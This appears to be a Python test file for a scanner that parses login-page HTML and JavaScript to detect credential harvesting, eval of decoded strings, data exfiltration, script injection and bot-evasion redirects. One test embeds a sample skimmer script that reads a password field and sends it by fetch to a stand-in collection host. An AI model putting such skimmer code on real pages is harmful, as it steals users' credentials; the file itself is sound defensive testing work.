from __future__ import annotations

from L3_SCANNER.models.input import HTMLInput, L3Input, ScriptInput
from L3_SCANNER.parsers.html_parser import parse_html
from L3_SCANNER.parsers.javascript_parser import parse_javascript
from L3_SCANNER.policies.detection import DetectionPolicy
from L3_SCANNER.policies.runtime import RuntimeConfig

DOCUMENT_URL = "https://login.example.com/account"


def policy(**overrides):
    values = {
        "credential_classifier": lambda field: (
            "password" if field.get("type") == "password" else None
        ),
        "dynamic_execution_apis": frozenset({"eval", "Function"}),
        "decode_methods": frozenset({"atob"}),
        "network_apis": frozenset({"fetch", "navigator.sendBeacon"}),
        "redirect_apis": frozenset(
            {"location.replace", "window.location", "location.href"}
        ),
        "anti_bot_properties": frozenset({"navigator.webdriver"}),
        "branch_behavior_normalizer": lambda branch: repr(
            branch.get("observations", [])
        ),
    }
    values.update(overrides)
    return DetectionPolicy(**values)


def scan_input(source: str | None, *, external: bool = False) -> L3Input:
    return L3Input(
        original_url=DOCUMENT_URL,
        document_url=DOCUMENT_URL,
        html=HTMLInput('<form><input id="password" type="password"></form>'),
        scripts=[
            ScriptInput(
                "script-1",
                "external" if external else "inline",
                source_url="https://cdn.example.net/app.js" if external else None,
                source=source,
            )
        ],
    )


def parse(source: str | None, active_policy: DetectionPolicy | None = None):
    value = scan_input(source)
    html_raw = parse_html(value.html.content, value.document_url)
    return parse_javascript(value, html_raw, active_policy or policy())


def test_parser_builds_shared_linked_events_with_static_provenance() -> None:
    raw = parse(
        """
        const password = document.getElementById('password').value;
        const decoded = atob('YWxlcnQoMSk=');
        eval(decoded);
        fetch('https://collect.example.net/login', {body: JSON.stringify(password)});
        const script = document.createElement('script');
        script.src = 'https://cdn.example.net/a.js';
        document.body.appendChild(script);
        if (navigator.webdriver) { location.replace('/bot'); } else { showLogin(); }
        """
    )
    assert raw["analysis"]["parsed_script_count"] == 1
    assert raw["dynamic_execution"][0]["decode_links"][0]["method"] == "atob"
    assert (
        raw["network_requests"][0]["source_links"][0]["credential_type"] == "password"
    )
    assert raw["network_requests"][0]["source_links"][0]["transformations"] == [
        "JSON.stringify"
    ]
    assert raw["script_injection"][0]["url"] == "https://cdn.example.net/a.js"
    assert raw["branches"][0]["properties"] == ["navigator.webdriver"]
    for collection in (
        "dynamic_execution",
        "network_requests",
        "credential_access",
        "environment_access",
    ):
        assert raw[collection][0]["script_id"] == "script-1"
        assert raw[collection][0]["origin"] == "static"
        assert raw[collection][0]["event_id"]


def test_api_reference_is_not_fabricated_as_a_call() -> None:
    raw = parse("const evaluator = eval; const sender = fetch;")
    assert raw["dynamic_execution"] == []
    assert raw["network_requests"] == []


def test_missing_external_source_and_parser_failure_are_structured() -> None:
    missing = scan_input(None, external=True)
    missing_raw = parse_javascript(
        missing,
        parse_html(missing.html.content, missing.document_url),
        policy(),
    )
    invalid = parse("function broken( {")
    assert missing_raw["scripts"][0]["source_url"] == "https://cdn.example.net/app.js"
    assert missing_raw["scripts"][0]["analysis_status"] == "missing_source"
    assert missing_raw["analysis"]["source_complete"] is False
    assert invalid["scripts"][0]["analysis_status"] == "parse_error"
    assert invalid["errors"][0]["code"] == "javascript_parse_error"


def test_source_and_event_limits_preserve_explicit_incomplete_state() -> None:
    too_large = parse_javascript(
        scan_input("eval('x');"),
        policy=policy(),
        runtime=RuntimeConfig(max_script_bytes=4),
    )
    event_limited = parse_javascript(
        scan_input("eval('x');" * 5),
        policy=policy(),
        runtime=RuntimeConfig(max_javascript_events=2),
    )
    assert too_large["scripts"][0]["analysis_status"] == "source_limit_exceeded"
    assert too_large["dynamic_execution"] == []
    assert len(event_limited["dynamic_execution"]) == 2
    assert event_limited["analysis"]["source_complete"] is False
    assert any(
        error["code"] == "javascript_event_limit_exceeded"
        for error in event_limited["errors"]
    )
